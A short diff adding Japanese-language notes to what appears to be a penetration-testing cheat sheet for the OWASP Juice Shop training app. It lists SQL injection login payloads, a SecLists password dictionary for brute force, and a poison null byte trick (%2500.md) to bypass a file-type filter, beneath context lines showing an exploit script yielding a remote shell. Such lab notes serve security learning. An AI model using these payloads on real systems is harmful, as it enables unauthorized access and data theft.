@@ -412,3 +412,23 @@ python 47887.py <url>
 # > Do you wish to launch a shell here? (y/n): y
 # RCE $
 ```
+
+### SQLインジェクション
+
+```bash
+' or 1=1--
+
+bender@juice-sh.op'--
+```
+
+### ブルートフォース
+
+```bash
+sudo apt install seclists
+# 以下の辞書をペイロードに指定する
+/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
+```
+
+- [403 Error: Only .md and .pdf files are allowed!]エラー対策
+  - <http://hostname/ftp/package.json.bak%2500.md>のように[%2500.md]でバイパスする
+    - Poison Null Byte: %2500
